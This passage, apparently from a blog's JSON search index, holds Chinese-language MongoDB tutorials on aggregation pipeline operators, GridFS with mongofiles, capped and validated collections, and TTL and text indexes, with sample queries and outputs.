\u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 执行的代码：\ndb.blog.aggregate([ { $group: { _id: \u0026#39;$author\u0026#39;, total: { $sum: 1 } } } ]); 返回的文档内容：\n{ \u0026#34;_id\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;total\u0026#34; : 1 } { \u0026#34;_id\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;total\u0026#34; : 1 } { \u0026#34;_id\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;total\u0026#34; : 2 } { \u0026#34;_id\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;total\u0026#34; : 1 } { \u0026#34;_id\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;total\u0026#34; : 2 } $unwind $unwind管道操作符可以将数组中的每个成员拆分为一个单独的文档，并输出给下一个管道操作。 比如下面的文档中a键包含了3个数组，使用$unwind管道操作符将成员拆分为单独的文档并输出。 实例的文档结构如下:\n{ a: [ { b: 1 }, { b: 2 }, { b: 3 } ] } 执行的代码：\ndb.blog.aggregate([ { $unwind: \u0026#39;$a\u0026#39; } ]); 返回的文档内容：\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;598c5807841dccce335a0e98\u0026#34;), \u0026#34;a\u0026#34; : { \u0026#34;b\u0026#34; : 1 } } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;598c5807841dccce335a0e98\u0026#34;), \u0026#34;a\u0026#34; : { \u0026#34;b\u0026#34; : 2 } } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;598c5807841dccce335a0e98\u0026#34;), \u0026#34;a\u0026#34; : { \u0026#34;b\u0026#34; : 3 } } $sort 排序是将上一个管道操作符输入进来的文档进行排序，它指定排序的键然后值为升序1和降序-1。 比如需要对下面的文档中的score键的值进行降序排序： 实例的文档结构如下:\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 执行的代码：\ndb.blog.aggregate([ { $sort: { score: -1 } } ]); 返回的文档：\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } $limit $limint管道操作符接受一个数字，将前n个文档输出。 比如下面输出下面文档的前3个文档：\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 执行的代码：\ndb.blog.aggregate([ { $limit: 3 } ]); 返回的文档内容：\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } $skip $limint管道操作符接受一个数字，将前n个文档后的文档输出到下一个管道。 比如下面输出下面文档的后2个文档：\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 执行的代码：\ndb.blog.aggregate([ { $skip: 5 } ]); 返回的文档内容：\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 其他 Mongodb不允许单一聚合操作符占用超过20%的内存，如果超过了就会直接抛出错误，并且尽可能的让$match管道操作符在前面，因为它可以使用索引，然后通过$project、$group尽可能的过滤掉不需要的数据。\n","permalink":"/posts/mongodb-aggregate/","summary":"参考 MongoDB权威指南(第2版)\nMongodb Docs\n前言 Mongodb提供了一个强大的处理框架，可以对集合中的文档进行各种组合、过滤、输出，如果你通过Mongodb其他的查询方法无法处理你的查询或者查询难度很高，那么你可以试试聚合。\n这里我们只讲解一下常用的聚合管道操作符，其他的可以自行到官方文档进行查询。\n语法 官方文档的聚合语法是这样的：\ndb.collection.aggregate（pipeline，options); 聚合：计算集合或视图中数据的聚合值，并且聚合接受一个数组，数组的每一个成员都是对象，对象里面子键都代表一个管道操作，按照顺序的从第一个管道操作到最后一个，每次操作完的文档返回给下一个管道操作。\npipeline： 一系列数据聚合操作或阶段。有关详细信息，请参阅 聚合管道运算，在版本2.6中更改：该方法仍然可以将流水线阶段接受为单独的参数，而不是数组中的元素; 但是，如果不指定pipeline为数组，则不能指定 options参数。\noptions:可选的。aggregate()传递给aggregate命令的附加选项。版本2.6中的新功能，仅当您指定pipeline为数组时可用。\n大概我们可以把聚合理解为对文档进行一系列的操作从而达到我们需要的查询文档，聚合提供了很多管道操作符，这些管道操作符就像一根一根的管道一些，而我们通过聚合操作的文档就像管道里面的水，这根管道流下来的水继续流到下一根管道，直到没有了管道，水就流出来了。 我将在下面讲解几个常用的管道操作符，你也可以单独使用其中任意的管道操作符，分别为：\nmatch(过滤): 过滤文档流，只允许匹配的文档未修改地传递到下一个流水线阶段。$match 使用标准的MongoDB查询。对于每个输入文档，输出一个文档（匹配）或零个文档（不匹配）。\n$project(映射)：重新整理流中的每个文档，例如添加新字段或删除现有字段。对于每个输入文档，输出一个文档。\n$group(分组)：通过一些指定的累加器将组文档输出到下一阶段，为每个不同的分组输出文档。\n$unwind(拆分)：从输入文档中解构一个数组字段，以输出每个元素的文档。每个输出文档用元素值替换数组。对于每个输入文档，输出n个文档，其中n是数组元素的数量，对于空数组可以为零。\n$sort(排序)：按指定的排序键重新排序文档流。\n$limit(限制)：将前n个文档传递到管道，n是一个数字。\n$skip(跳过)：将前n个文档丢弃，后面的部分传递到管道。\n上面的顺序一般是我们常用的顺序，首先我们筛选一部分文档，然后从筛选中整理一份更加便于我们操作的文档，然后在对整理好的文档通过一些表达式来分组整理，然后通过排序、限制、跳过，得到我们最终的结果。 在管道操作符中如果需要指定文档中的某个键的时候，需要在键名前面加上$符号，比如文档中的name键，在管道操作中要指定它就得这样写$name。 并且我们所有的操作的文档都不是操作储存在硬盘中的数据，我们操作的文档都是储存在内存当中，所以不影响原始数据。\n管道操作符 $match $match应尽量放在聚合的最前面，因为$match使用的是Mongodb的标准查询，所以可以使用索引来提高我们的效率，其次是可以过滤掉不需要的文档，让后续的操作更加效率。 既然是标准的查询我们就可以使用标准查询里面所有操作符。 下面来大概演示一下$match的操作方法： 实例的文档结构如下:\n{ \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc95fe835e68f199c8686\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 80, \u0026#34;views\u0026#34; : 100 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;512bc962e835e68f199c8687\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;dave\u0026#34;, \u0026#34;score\u0026#34; : 85, \u0026#34;views\u0026#34; : 521 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b257\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ahn\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 1000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a192d4bede9ac365b258\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 55, \u0026#34;views\u0026#34; : 5000 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b259\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;annT\u0026#34;, \u0026#34;score\u0026#34; : 60, \u0026#34;views\u0026#34; : 50 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25a\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;li\u0026#34;, \u0026#34;score\u0026#34; : 94, \u0026#34;views\u0026#34; : 999 } { \u0026#34;_id\u0026#34; : ObjectId(\u0026#34;55f5a1d3d4bede9ac365b25b\u0026#34;), \u0026#34;author\u0026#34; : \u0026#34;ty\u0026#34;, \u0026#34;score\u0026#34; : 95, \u0026#34;views\u0026#34; : 1000 } 查询author键的值为dave的文档：","title":"Mongodb 聚合"},{"content":"参考 MongoDB权威指南(第2版)\nMongodb Docs\n前言 Mongodb提供了一个轻量级的文件系统来专门处理超过16MB的文件，这个文件系统叫GridFS，它的使用非常简单，几乎所有的Mongodb驱动程序都提供了GridFS API。GridFS将集合放在一个共享的储存区域，GridFS使用两个集合来存储我们存放的数据：\nfs.files：这个集合当中的每一个文档都表示一个文件的信息 fs.chunks：这个集合中存放实际的数据内容 GridFS存储的文件无法进行修改，如果要进行修改只能删除修改的文档，然后再将修改完的文档重新保存。\n下面讲一下如何使用Mongodb提供的mongodfiles客户端来操作GridFS数据：\nmongofiles \u0026lt;options\u0026gt; \u0026lt;commands\u0026gt; \u0026lt;filename\u0026gt; mongofiles命令的组成部分是：\noptions:您可以使用一个或多个这些选项来控制其行为mongofiles。 commands:使用这些命令之一来确定动作mongofiles。 filename:本地文件系统上的一个文件的名称，也可以是一个GridFS对象。 mongodfiles默认链接到本地127.0.0.1:27017的数据库上面，如果需要指定数据库和地址需要像下面这样来，然后后面根着需要执行的命令。\nmongofiles --host 127.0.0.1 -p 27017 需要执行的命令 常用的命令有四个：\nlist：列出数据库GridFS中的文件 put：将文件系统中的文件上传到GridFS get：用于将GridFS中的文件下载到文件系统中 search：用于搜索GridFS系统中的文件 delete：用于删除GridFS系统中的文件 比如我将一个含有文本xsscript的txt文件上传到GridFS中：\n$ echo \u0026#34;xsscript\u0026#34; \u0026gt; t.txt $ ./mongofiles put t.txt connected to: localhost added file: t.txt 搜索文件：\n$ ./mongofiles list 2017-08-09T16:18:06.985+0800 connected to: localhost t.txt 9 $ ./mongofiles search t 2017-08-09T16:21:42.994+0800 connected to: localhost t.txt 9 下载文件到当前文件系统中：\n$ ./mongofiles get t.txt 删除文件：\n$ ./mongofiles delete t.txt 结尾 Mongodb提供的GridFS系统非常强大，可以根据个人的需求来看待它，并且它的应用范围也很广。目前我就用GridFS给自己写了一个知识库系统。\n如果大家对GridFS特别有兴趣，可以参考一下官方文档，里面解释的非常详细以及还有一些很好的例子\n文完\n","permalink":"/posts/mongodb-gridfs/","summary":"参考 MongoDB权威指南(第2版)\nMongodb Docs\n前言 Mongodb提供了一个轻量级的文件系统来专门处理超过16MB的文件，这个文件系统叫GridFS，它的使用非常简单，几乎所有的Mongodb驱动程序都提供了GridFS API。GridFS将集合放在一个共享的储存区域，GridFS使用两个集合来存储我们存放的数据：\nfs.files：这个集合当中的每一个文档都表示一个文件的信息 fs.chunks：这个集合中存放实际的数据内容 GridFS存储的文件无法进行修改，如果要进行修改只能删除修改的文档，然后再将修改完的文档重新保存。\n下面讲一下如何使用Mongodb提供的mongodfiles客户端来操作GridFS数据：\nmongofiles \u0026lt;options\u0026gt; \u0026lt;commands\u0026gt; \u0026lt;filename\u0026gt; mongofiles命令的组成部分是：\noptions:您可以使用一个或多个这些选项来控制其行为mongofiles。 commands:使用这些命令之一来确定动作mongofiles。 filename:本地文件系统上的一个文件的名称，也可以是一个GridFS对象。 mongodfiles默认链接到本地127.0.0.1:27017的数据库上面，如果需要指定数据库和地址需要像下面这样来，然后后面根着需要执行的命令。\nmongofiles --host 127.0.0.1 -p 27017 需要执行的命令 常用的命令有四个：\nlist：列出数据库GridFS中的文件 put：将文件系统中的文件上传到GridFS get：用于将GridFS中的文件下载到文件系统中 search：用于搜索GridFS系统中的文件 delete：用于删除GridFS系统中的文件 比如我将一个含有文本xsscript的txt文件上传到GridFS中：\n$ echo \u0026#34;xsscript\u0026#34; \u0026gt; t.txt $ ./mongofiles put t.txt connected to: localhost added file: t.txt 搜索文件：\n$ ./mongofiles list 2017-08-09T16:18:06.985+0800 connected to: localhost t.txt 9 $ ./mongofiles search t 2017-08-09T16:21:42.994+0800 connected to: localhost t.txt 9 下载文件到当前文件系统中：\n$ .","title":"Mongodb GridFS"},{"content":"参考 MongoDB权威指南(第2版)\nMongodb Docs\n特殊集合 封顶集合 封顶集合和普通集合不一样，普通集合的大小是可以随着数据的增加而增加的，封顶集合是在创建的时候就已经设置了集合的大小。\n封顶集合的大小已经满了后，当再次插入数据的时候，它会把最老的数据丢掉，然后写入新数据，封顶集合不难看出很适合当log型数据库。\n创建封顶集合 创建封顶集合我们需要显式的创建集合，因为需要在显式创建的方法中设置一些选项，同时我们需要在选项中设置两个选项capped和size。\ndb.createCollection(\u0026#39;test\u0026#39;, { capped: true, size: 10485760 }) 上面的代码中capped设置为true代表创建的文档是一个封顶文档，而设置了capped为true后，必须指定size选项，size选项是指定的固定集合的大小，单位为字节(Byte)。\n除此这两个设置外，还可以指定max选项，设置它过后，可以控制总体文档的数量，如果超过设置的数量，就把最老的数据丢掉，写入新数据。\ndb.createCollection(\u0026#39;test\u0026#39;, { capped: true, size: 10485760, max: 5000 }) 上面的代码设置了三个选项，其中一个表示创建封顶集合，一个是封顶集合的大小，还有一个是封顶集合的最大文档数量。集合的大小和集合的文档数量，只要其中一个条件满足都会从最老的数据位置开始覆盖写入。\n需要注意的是封顶集合一旦创建就不能在改变，只有通过删除此集合然后在新建。\n封顶集合的自然排序是由旧到新的，如果我们需要由新到旧的顺序查询我们的文档，我们可以通过下面的代码来执行：\ndb.test.find({}).sort({$natural: -1}); 文档验证集合 我们在创建集合的时候可以通过设置一个或多个键的值验证机制，这样当写入数据的时候，Mongodb会进行验证，如果通过则写入，如果没有通过则抛出错误，设置验证文档通过validator选项，它接受一个对象，在里面可以使用元操作符$。\n比如下面的代码我设置了一个文档必须设置一个name值，并且值必须为String类型：\ndb.createCollection(\u0026#39;blog\u0026#39;, { validator: { name: { $type: \u0026#39;string\u0026#39; } } }); 然后我们试着插入一个带name的文档但值为数值和插入一个带name的文档值为字符串类型。\n\u0026gt; db.blog.insert({name: 123, age: 18}) WriteResult({ \u0026#34;nInserted\u0026#34; : 0, \u0026#34;writeError\u0026#34; : { \u0026#34;code\u0026#34; : 121, \u0026#34;errmsg\u0026#34; : \u0026#34;Document failed validation\u0026#34; } }) 从上面的返回中可以看到错误消息提示的是文档验证失败，而我们试着插入一个合法的数据看看返回的是什么：\n\u0026gt; db.blog.insert({name: \u0026#39;123\u0026#39;, age: 18}) WriteResult({ \u0026#34;nInserted\u0026#34; : 1 }) 查看集合验证 设置了验证后，我们可以通过官方提供的getCollectionInfos()方法来查看数据库上面哪些集合设置了文档验证，它有一个可选参数，接受一个对象，其中name的值代表集合名称，可以获取指定集合的文档验证：\ndb.getCollectionInfos(); 它返回的大概内容为：\n[ { \u0026#34;name\u0026#34; : \u0026#34;blog\u0026#34;, \u0026#34;type\u0026#34; : \u0026#34;collection\u0026#34;, \u0026#34;options\u0026#34; : { \u0026#34;validator\u0026#34; : { \u0026#34;name\u0026#34; : { \u0026#34;$type\u0026#34; : \u0026#34;string\u0026#34; } } }, \u0026#34;info\u0026#34; : { \u0026#34;readOnly\u0026#34; : false }, \u0026#34;idIndex\u0026#34; : { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;_id\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;_id_\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;blog.blog\u0026#34; } }, { \u0026#34;name\u0026#34; : \u0026#34;test\u0026#34;, \u0026#34;type\u0026#34; : \u0026#34;collection\u0026#34;, \u0026#34;options\u0026#34; : { }, \u0026#34;info\u0026#34; : { \u0026#34;readOnly\u0026#34; : false }, \u0026#34;idIndex\u0026#34; : { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;_id\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;_id_\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;blog.test\u0026#34; } } ] 其中我们可以看见options里面的validator中含有我们的验证信息，我们可以获取指定集合的文档验证信息：\ndb.getCollectionInfos({name: \u0026#39;blog\u0026#39;}); 返回的信息：\n[ { \u0026#34;name\u0026#34; : \u0026#34;blog\u0026#34;, \u0026#34;type\u0026#34; : \u0026#34;collection\u0026#34;, \u0026#34;options\u0026#34; : { \u0026#34;validator\u0026#34; : { \u0026#34;name\u0026#34; : { \u0026#34;$type\u0026#34; : \u0026#34;string\u0026#34; } } }, \u0026#34;info\u0026#34; : { \u0026#34;readOnly\u0026#34; : false }, \u0026#34;idIndex\u0026#34; : { \u0026#34;v\u0026#34; : 2, \u0026#34;key\u0026#34; : { \u0026#34;_id\u0026#34; : 1 }, \u0026#34;name\u0026#34; : \u0026#34;_id_\u0026#34;, \u0026#34;ns\u0026#34; : \u0026#34;blog.blog\u0026#34; } } ] 如果你需要禁用这个文档的验证，你可以通过执行命令来设置validationLevel的值为off，如果validationLevel的值为strict，则默认开始所有文档验证，其中collMod的值是集合的名称，可以把这个理解为collection mod集合修改\ndb.runCommand({collMod: \u0026#39;blog\u0026#39;, validationLevel: \u0026#39;off\u0026#39;}); 在创建集合中还有很多选项，我这里只是拿出了一小部分常用的、容易理解的选项出来说，如果对其他选项有兴趣可以查看官方文档\n特殊索引 TTL索引 TTL索引会给所有的文档设置一个过期时间，如果一旦过期，文档将会删除，设置一个TTL索引的方式如下：\ndb.blog.createIndex({da: 1}, { expireAfterSeconds: 10 }); 文档内容：\n{ da: new Date(), s: 1 } 设置索引的键必须为日期类型的值，expireAfterSeconds键的值表示过期时间，以秒为单位。\n这个设置将影响集合中所有文档，包括之前的所有文档，比如上面设置的10秒后过期，那么所有的文档将在10秒后过期，如果需要续期，就可以更新TTL索引的键的值为最新时间即可，这个常用于会话。\n文本索引 文本索引需要将索引的键的值设置为字符串text，并且一个集合只能有一个文本索引，但是可以组合一个复合的文本索引，在查询的过程中，使用$text运算符对所有文本索引的键的值进行查询：\ndb.blog.insert({a: \u0026#39;asd789\u0026#39;}); db.blog.createIndex({a: \u0026#39;text\u0026#39;}); db.blog.find({$text: {$search: \u0026#39;asd789\u0026#39;}}); 文本索引会造成当前的集合更加缓慢，因为它是把索引的键的值全部索引，所以尽可能的少用文本索引。\n文完\n","permalink":"/posts/mongodb-special-collection-index/","summary":"参考 MongoDB权威指南(第2版)\nMongodb Docs\n特殊集合 封顶集合 封顶集合和普通集合不一样，普通集合的大小是可以随着数据的增加而增加的，封顶集合是在创建的时候就已经设置了集合的大小。\n封顶集合的大小已经满了后，当再次插入数据的时候，它会把最老的数据丢掉，然后写入新数据，封顶集合不难看出很适合当log型数据库。\n创建封顶集合 创建封顶集合我们需要显式的创建集合，因为需要在显式创建的方法中设置一些选项，同时我们需要在选项中设置两个选项capped和size。\ndb.createCollection(\u0026#39;test\u0026#39;, { capped: true, size: 10485760 }) 上面的代码中capped设置为true代表创建的文档是一个封顶文档，而设置了capped为true后，必须指定size选项，size选项是指定的固定集合的大小，单位为字节(Byte)。\n除此这两个设置外，还可以指定max选项，设置它过后，可以控制总体文档的数量，如果超过设置的数量，就把最老的数据丢掉，写入新数据。\ndb.createCollection(\u0026#39;test\u0026#39;, { capped: true, size: 10485760, max: 5000 }) 上面的代码设置了三个选项，其中一个表示创建封顶集合，一个是封顶集合的大小，还有一个是封顶集合的最大文档数量。集合的大小和集合的文档数量，只要其中一个条件满足都会从最老的数据位置开始覆盖写入。\n需要注意的是封顶集合一旦创建就不能在改变，只有通过删除此集合然后在新建。\n封顶集合的自然排序是由旧到新的，如果我们需要由新到旧的顺序查询我们的文档，我们可以通过下面的代码来执行：\ndb.test.find({}).sort({$natural: -1}); 文档验证集合 我们在创建集合的时候可以通过设置一个或多个键的值验证机制，这样当写入数据的时候，Mongodb会进行验证，如果通过则写入，如果没有通过则抛出错误，设置验证文档通过validator选项，它接受一个对象，在里面可以使用元操作符$。\n比如下面的代码我设置了一个文档必须设置一个name值，并且值必须为String类型：\ndb.createCollection(\u0026#39;blog\u0026#39;, { validator: { name: { $type: \u0026#39;string\u0026#39; } } }); 然后我们试着插入一个带name的文档但值为数值和插入一个带name的文档值为字符串类型。\n\u0026gt; db.blog.insert({name: 123, age: 18}) WriteResult({ \u0026#34;nInserted\u0026#34; : 0, \u0026#34;writeError\u0026#34; : { \u0026#34;code\u0026#34; : 121, \u0026#34;errmsg\u0026#34; : \u0026#34;Document failed validation\u0026#34; } }) 从上面的返回中可以看到错误消息提示的是文档验证失败，而我们试着插入一个合法的数据看看返回的是什么：","title":"Mongodb特殊索引和集合"},{"content":"参考 MongoDB权威指南(第2版)\nMongodb Docs\n前言 建立索引对于任何需要提高查询速度的数据库来说都非常重要，那么索引究竟是一个什么？首先来看看下面是《区块链:技术驱动金融》这本书的前两章的目录。\n第1章密码学及加密货币概述----------1 1.1密码学哈希函数----------4 1.2哈希指针及数据结构----------14 1.3数字签名----------19 1.4公钥即身份----------24 1.5两种简单的加密货币----------26 第2章比特币如何做到去中心化----------35 2.1中心化与去中心化----------37 2.2分布式共识----------39 2.3使用区块链达成没有身份的共识----------44 2.4奖励机制与工作量证明----------51 2.5总结----------59 通过目录，我们能很快很清楚的知道这本书写了什么，而我们也能很快从中查找到我们感兴趣的内容在哪一页，如果没有目录，我们将会一篇一篇的去翻阅我们想了解的内容，而索引可以比作数据库的目录。\n效率 